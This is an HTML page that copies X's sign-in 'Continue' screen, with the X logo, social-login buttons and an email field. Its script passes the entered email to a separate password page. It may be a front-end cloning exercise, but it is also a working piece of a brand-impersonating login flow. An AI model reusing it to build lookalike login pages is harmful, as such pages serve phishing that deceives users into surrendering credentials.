<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X - Continue</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            padding: 2rem 1.5rem;
            max-width: 500px;
            margin: 0 auto;
        }

        /* Fixed Back Button */
        .back-arrow {
            font-size: 1.5rem;
            margin-bottom: 2rem;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            color: #000;
        }

        .logo {
            text-align: center;
            margin-bottom: 2rem;
        }

        .logo svg {
            width: 40px;
            height: 40px;
            fill: #1da1f2;
        }

        h1 {
            font-size: 2.2rem;
            font-weight: 700;
            margin-bottom: 0.8rem;
            color: #000000;
        }

        .subtext {
            font-size: 1.1rem;
            color: #657786;
            margin-bottom: 2.5rem;
        }

        .button {
            width: 100%;
            padding: 1rem;
            border-radius: 9999px;
            border: none;
            font-size: 1.1rem;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.8rem;
            margin-bottom: 1rem;
            cursor: pointer;
        }

        .phone-btn {
            background-color: #000000;
            color: #ffffff;
        }

        .google-btn, .apple-btn {
            background-color: #ffffff;
            color: #000000;
            border: 1px solid #e1e8ed;
        }

        .button svg {
            width: 22px;
            height: 22px;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 1.5rem 0;
            color: #657786;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e1e8ed;
        }

        .divider span {
            padding: 0 1rem;
        }

        .input-field {
            width: 100%;
            padding: 1rem;
            border: 2px solid #1da1f2;
            border-radius: 8px;
            font-size: 1.1rem;
            margin-bottom: 2rem;
            outline: none;
        }

        .input-field::placeholder {
            color: #1da1f2;
        }

        .continue-btn {
            width: 100%;
            padding: 1rem;
            border-radius: 9999px;
            border: none;
            background-color: black;
            color: #aab8c2;
            font-size: 1.1rem;
            font-weight: 500;
            margin-bottom: 2rem;
            text-decoration: none;
            display: block;
            text-align: center;
        }

        .terms {
            font-size: 0.9rem;
            color: #657786;
            text-align: center;
            line-height: 1.5;
        }

        .terms a {
            color: #1da1f2;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <a href="X.html" class="back-arrow">←</a>

    <div class="logo">
        <svg viewBox="0 0 24 24">
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
        </svg>
    </div>

    <h1>See what's happening</h1>
    <p class="subtext">Select an option below:</p>

    <button class="button phone-btn">
        <span>📞</span> Continue with phone
    </button>

    <button class="button google-btn">
        <!-- Working Google Icon -->
        <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
        Continue with Google
    </button>

    <button class="button apple-btn">
        <!-- Working Apple Icon -->
        <svg viewBox="0 0 24 24"><path d="M14.94 5.19A4.38 4.38 0 0 0 16 2.5a4.38 4.38 0 0 0-2.91 1.19c-.77.7-1.23 1.66-1.23 2.72s.46 2.02 1.23 2.72c.77.7 1.79 1.09 2.91 1.09s2.14-.39 2.91-1.09c.77-.7 1.23-1.66 1.23-2.72s-.46-2.02-1.23-2.72A4.38 4.38 0 0 0 16 2.5a4.38 4.38 0 0 0-1.06 2.69zm-2.91 5.43c-1.54 0-2.88-.63-3.89-1.66-.97-.99-1.54-2.33-1.54-3.77s.57-2.78 1.54-3.77C9.15.63 10.49 0 12.03 0s2.88.63 3.89 1.66c.97.99 1.54 2.33 1.54 3.77s-.57 2.78-1.54 3.77c-1.01 1.03-2.35 1.66-3.89 1.66zm-7.22 11.72c-.32-.43-.59-.88-.81-1.35-.42-.89-.67-1.83-.75-2.79-.08-.96-.02-1.93.17-2.87.19-.94.51-1.84.96-2.67.45-.83 1.02-1.58 1.71-2.22.69-.64 1.48-1.16 2.36-1.55.88-.39 1.81-.63 2.76-.72.95-.09 1.91-.03 2.84.18.93.21 1.81.57 2.62 1.06.81.49 1.53 1.11 2.13 1.84.6.73 1.07 1.56 1.4 2.45.33.89.51 1.83.54 2.79.03.96-.09 1.92-.34 2.85-.25.93-.63 1.81-1.14 2.61z"/></svg>
        Continue with Apple
    </button>

    <div class="divider">
        <span>or</span>
    </div>

    <input type="text" id="emailInput" class="input-field" placeholder="Email or username">

    <a href="X_Password.html" id="continueLink" class="continue-btn">Continue</a>

    <p class="terms">
        By continuing, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookie Use</a>.
    </p>

    <script>
        document.getElementById('continueLink').addEventListener('click', function(e) {
            e.preventDefault();
            let emailValue = document.getElementById('emailInput').value.trim();
            if (emailValue) {
                window.location.href = 'X_Password.html?email=' + encodeURIComponent(emailValue);
            } else {
                alert("Please enter your email or username first.");
            }
        });
    </script>

</body>
</html>
